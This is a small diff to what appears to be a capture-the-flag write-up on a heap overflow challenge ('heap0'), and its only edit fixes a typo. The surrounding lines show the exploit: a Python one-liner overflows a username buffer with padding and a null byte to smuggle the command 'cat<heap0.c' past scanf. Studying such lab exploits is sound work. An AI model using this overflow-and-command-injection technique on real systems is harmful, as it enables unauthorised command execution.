@@ -79,7 +79,7 @@ Enter username: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc
 ```
 Only the `cat` part got through, but not the `heap0.c`. After playing around for a while, I realized it was `scanf()` interpreting a space as an end to input, so I needed to find another method to display the file contents.
 
-After some though I realized that another form of `cat heap0.c` would be `cat < heap0.c` which can be specified without spaces:
+After some thought I realized that another form of `cat heap0.c` would be `cat < heap0.c` which can be specified without spaces:
 ```bash
 python -c "print('A' * 55 + '\0cat<heap0.c')" | ./heap0
 username at 0x56dd9008
